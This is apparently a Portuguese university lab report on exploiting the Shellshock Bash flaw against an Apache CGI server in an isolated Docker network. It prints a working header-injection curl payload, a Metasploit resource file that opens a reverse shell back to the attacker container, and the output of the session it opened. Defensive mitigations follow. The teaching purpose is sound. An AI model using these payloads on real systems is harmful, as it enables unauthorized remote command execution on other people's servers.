# Relatorio - Exploit Shellshock com Metasploit

Disciplina: Engenharia de Seguranca  
Trabalho: Pentest com Metasploit  
Tema: Exploracao da vulnerabilidade Shellshock (CVE-2014-6271)

## Integrantes

- Nome 1 - NUSP/RA:
- Nome 2 - NUSP/RA:
- Nome 3 - NUSP/RA:
- Nome 4 - NUSP/RA:

## 1. Resumo

Este trabalho apresenta a exploracao da vulnerabilidade Shellshock
(CVE-2014-6271) em um ambiente controlado com Docker. O alvo e um servidor
Apache com suporte a CGI, executando um script interpretado por uma versao
vulneravel do Bash. O ataque foi realizado com o Metasploit Framework, usando o
modulo `exploit/multi/http/apache_mod_cgi_bash_env_exec`.

A exploracao demonstrou execucao remota de comandos com os privilegios do
usuario do servidor web (`www-data`). O ambiente foi isolado em uma rede Docker
interna, com uma maquina atacante e uma maquina vitima.

## 2. Objetivo

O objetivo do experimento e estudar, analisar e implementar um exploit usando
Metasploit, demonstrando:

- o conceito da vulnerabilidade Shellshock;
- como dados de uma requisicao HTTP podem ser transformados em variaveis de
  ambiente pelo CGI;
- como o Bash vulneravel interpreta indevidamente essas variaveis;
- como o Metasploit automatiza a exploracao;
- quais defesas poderiam impedir ou reduzir o impacto do ataque.

## 3. Vulnerabilidade explorada

- CVE: CVE-2014-6271
- Nome comum: Shellshock
- Software afetado: GNU Bash sem o patch de setembro de 2014
- Superficie explorada: Apache CGI
- Endpoint vulneravel: `/cgi-bin/status.cgi`
- Impacto: execucao remota de comandos com os privilegios do processo web

Shellshock ocorre quando uma versao vulneravel do Bash importa uma variavel de
ambiente que parece conter uma definicao de funcao. O Bash interpreta a funcao,
mas tambem executa comandos adicionais anexados ao valor da variavel.

Padrao simplificado:

```text
() { :;}; comando_malicioso
```

Em servidores CGI, cabecalhos HTTP como `User-Agent`, `Cookie` e `Referer`
podem ser convertidos em variaveis de ambiente. Por exemplo, o cabecalho
`User-Agent` pode chegar ao CGI como `HTTP_USER_AGENT`. Se o script CGI for
executado por Bash vulneravel, o conteudo controlado pelo atacante pode ser
interpretado como comando.

## 4. Ambiente controlado

O laboratorio foi criado com Docker Compose e possui dois containers:

- Atacante: `metasploit-attacker:local`, baseado em
  `metasploitframework/metasploit-framework`
- Vitima: `shellshock-victim:local`, com Apache CGI e Bash vulneravel
- Rede: `pentest_net`
- Subnet: `172.28.0.0/24`
- IP do atacante: `172.28.0.10`
- IP da vitima: `172.28.0.20`

A rede foi configurada como interna (`internal: true`) para manter o experimento
isolado.

## 5. Ferramentas utilizadas

- Docker: criacao e execucao do ambiente controlado
- Docker Compose: orquestracao dos containers
- Apache CGI: superficie vulneravel explorada
- Bash 4.3: versao vulneravel usada na vitima
- curl: validacao manual da vulnerabilidade
- Metasploit Framework: execucao do exploit e payload

## 6. Roteiro de implementacao do ataque

### 6.1. Construcao e inicializacao do laboratorio

Comando executado:

```bash
docker compose up --build
```

Saida observada:

```text
[+] up 4/4
Image shellshock-victim:local   Built
Image metasploit-attacker:local Built
Container attacker              Recreated
Container victim                Recreated
Attaching to attacker, victim
```

Durante a inicializacao da vitima, o Apache exibiu o aviso abaixo:

```text
apache2: Could not reliably determine the server's fully qualified domain name,
using 172.28.0.20. Set the 'ServerName' directive globally to suppress this
message
```

Esse aviso nao impede a demonstracao, pois apenas informa que o Apache nao
possui um `ServerName` global configurado.

### 6.2. Validacao do endpoint CGI

Comando executado:

```bash
docker exec -it attacker curl http://172.28.0.20/cgi-bin/status.cgi
```

Saida observada:

```text
Shellshock lab victim
CGI script executed as: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Server time: Mon Jun 15 17:05:15 UTC 2026
```

A saida confirma que o endpoint CGI estava acessivel e que o script era
executado como `www-data`, usuario associado ao processo web.

### 6.3. Validacao manual da vulnerabilidade

Comandos executados:

```bash
docker exec -it attacker curl -H 'User-Agent: () { :;}; /bin/touch /tmp/shellshock-proof' http://172.28.0.20/cgi-bin/status.cgi
docker exec -it victim ls -l /tmp/shellshock-proof
```

Saida observada na requisicao maliciosa:

```text
500 Internal Server Error
```

Saida observada na verificacao da vitima:

```text
-rw-r--r-- 1 www-data www-data 0 Jun 15 17:05 /tmp/shellshock-proof
```

Mesmo com a resposta HTTP `500 Internal Server Error`, a exploracao foi
confirmada. O arquivo `/tmp/shellshock-proof` foi criado na vitima com dono
`www-data`, demonstrando que o comando injetado no cabecalho HTTP foi executado
no servidor.

### 6.4. Exploracao com Metasploit

Comando executado:

```bash
docker exec -it attacker /usr/src/metasploit-framework/msfconsole -r /workspace/metasploit/shellshock.rc
```

Arquivo de recurso utilizado:

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 172.28.0.20
set RPORT 80
set TARGETURI /cgi-bin/status.cgi
set TARGET 0
set PAYLOAD generic/shell_reverse_tcp
set LHOST 172.28.0.10
set LPORT 4444
check
run
```

Saida observada:

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 172.28.0.20
set RPORT 80
set TARGETURI /cgi-bin/status.cgi
set TARGET 0
set PAYLOAD generic/shell_reverse_tcp
set LHOST 172.28.0.10
set LPORT 4444
check
[+] 172.28.0.20:80 - The target is vulnerable.
run
[*] Started reverse TCP handler on 172.28.0.10:4444
[*] Command Stager progress - 100.00% done (817/817 bytes)
[*] Command shell session 1 opened (172.28.0.10:4444 -> 172.28.0.20:40536)
```

O trecho `The target is vulnerable` confirma que o modulo identificou a falha
no alvo. O trecho `Command shell session 1 opened` confirma que o payload abriu
uma sessao de shell reverso entre a vitima e o atacante.

### 6.5. Comandos demonstrativos na sessao

Depois da abertura da sessao, os seguintes comandos podem ser usados para
demonstrar o acesso obtido:

```bash
sessions -i 1
id
hostname
pwd
cat /etc/os-release
```

O comando `id` e especialmente importante porque demonstra que a execucao
remota ocorre com os privilegios do usuario `www-data`. O ataque nao fornece
acesso root diretamente, mas ja representa comprometimento do servico web.

## 7. Analise dos pacotes modificados

O pacote HTTP malicioso altera o valor de um cabecalho comum da requisicao. Em
uma requisicao normal, `User-Agent` apenas identifica o cliente HTTP. No ataque,
esse campo passa a carregar a assinatura do Shellshock:

```text
User-Agent: () { :;}; comando
```

Fluxo do ataque:

1. O atacante envia uma requisicao HTTP para o CGI vulneravel.
2. O Apache recebe o cabecalho `User-Agent`.
3. O CGI transforma esse cabecalho em uma variavel de ambiente.
4. O script CGI e executado por uma versao vulneravel do Bash.
5. O Bash interpreta indevidamente a variavel de ambiente.
6. O comando anexado ao cabecalho e executado no servidor.

No teste manual, o comando anexado foi:

```text
/bin/touch /tmp/shellshock-proof
```

Na exploracao com Metasploit, o modulo automatizou o envio do cabecalho
malicioso e executou um stager responsavel por abrir uma shell reversa.

## 8. Defesas e mitigacoes

### 8.1. Atualizacao do Bash

A mitigacao principal e atualizar o Bash para uma versao corrigida. Sistemas
atualizados nao devem interpretar comandos adicionais apos a definicao de
funcao em variaveis de ambiente.

### 8.2. Remocao ou restricao de CGI

CGI aumenta a superficie de ataque porque transforma dados HTTP em variaveis de
ambiente. Quando possivel, CGI deve ser removido, desabilitado ou substituido
por mecanismos mais modernos e controlados.

### 8.3. Menor privilegio

O servidor web deve executar com usuario de baixo privilegio. No laboratorio, o
ataque executou como `www-data`, limitando o impacto inicial. Em um ambiente
mal configurado, a execucao como usuario privilegiado aumentaria
consideravelmente o dano.

### 8.4. Filtragem de requisicoes

Um WAF ou reverse proxy pode bloquear cabecalhos contendo padroes suspeitos,
como:

```text
() {
```

Essa defesa nao substitui a correcao do Bash, mas pode reduzir a exploracao de
alvos legados.

### 8.5. Restricao de trafego de saida

O payload utilizado abre uma shell reversa, ou seja, a vitima inicia conexao de
volta para o atacante. Regras de firewall restringindo conexoes de saida podem
dificultar esse tipo de payload.

### 8.6. Monitoramento e hardening

Logs HTTP, alertas de comandos inesperados e ferramentas como AppArmor, SELinux
ou perfis seccomp podem reduzir o impacto do comprometimento e auxiliar na
deteccao.

## 9. Conclusao

O experimento demonstrou com sucesso a exploracao da vulnerabilidade Shellshock
em ambiente controlado. A validacao manual mostrou que um cabecalho HTTP
malicioso foi suficiente para executar um comando na vitima. Em seguida, o
Metasploit confirmou a vulnerabilidade e abriu uma shell reversa.

A principal causa do ataque e a combinacao de CGI com uma versao vulneravel do
Bash. A defesa mais efetiva e manter o Bash atualizado. Medidas
complementares, como remover CGI, aplicar menor privilegio, filtrar requisicoes
e restringir trafego de saida, ajudam a reduzir a probabilidade e o impacto da
exploracao.

## 10. Referencias

- NVD - CVE-2014-6271:
  https://nvd.nist.gov/vuln/detail/CVE-2014-6271
- Rapid7 - Metasploit module `apache_mod_cgi_bash_env_exec`:
  https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec/
- GNU Bash:
  https://www.gnu.org/software/bash/
- Apache HTTP Server - CGI:
  https://httpd.apache.org/docs/current/howto/cgi.html
